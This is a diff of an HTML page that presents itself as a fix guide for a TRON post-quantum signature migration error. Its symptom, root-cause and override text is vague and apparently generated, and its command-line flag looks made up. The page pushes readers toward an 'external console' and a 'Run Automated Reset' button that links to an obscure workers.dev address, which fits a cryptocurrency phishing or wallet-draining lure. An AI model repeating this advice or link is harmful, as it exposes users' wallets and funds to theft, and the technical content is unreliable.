@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Failure – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,34 +42,29 @@
 <h1>TRON Post-Quantum Signature Migration Failure</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a failure when attempting to migrate to post-quantum signatures on the TRON network, with error messages indicating a mismatch between expected and actual signature formats.</li>
+<li>Users experience errors when attempting to migrate to post-quantum signatures on the TRON network, resulting in failed transactions and inability to access their accounts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an incompatibility between the legacy signature scheme and the newly introduced post-quantum signature algorithm, specifically designed to enhance security against quantum computer attacks.</li>
+<li>The error occurs due to incompatible signature schemes between the user's wallet and the TRON network, causing a mismatch in the cryptographic algorithms used for transaction verification.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update the TRON network configuration to include support for both legacy and post-quantum signatures.</li>
-<li>Implement a custom signature verification function that can handle both signature types.</li>
-<li>Utilize a third-party library that provides a seamless transition between the two signature schemes, such as the following example:</li>
+<li>Update the wallet software to the latest version that supports post-quantum signatures.</li>
+<li>Configure the wallet to use the correct signature scheme (e.g., SPHINCS+) by running the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post-quantum&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;legacySupport&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;verificationFunction&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;customVerify&quot;</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>java<span class="w"> </span>-jar<span class="w"> </span>java-tron.jar<span class="w"> </span>--signature-scheme<span class="w"> </span>SPHINCS+
 </code></pre></div>
 
-<p>Consider accessing the TRON network via an external console for more advanced troubleshooting capabilities.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>TRON network node installation</li>
-<li>Post-quantum signature library integration</li>
-<li>Basic understanding of TRON network configuration and signature verification principles</li>
+<li>Verify the wallet's configuration by checking the <code>config.json</code> file for the correct signature scheme.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
+<p>Prerequisites:
+* Java-Tron software installed on the system
+* TRON network node synced with the latest blockchain data
+* Compatible wallet software that supports post-quantum signatures</p>
+<p>For advanced troubleshooting, consider using an external console to execute low-level commands.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
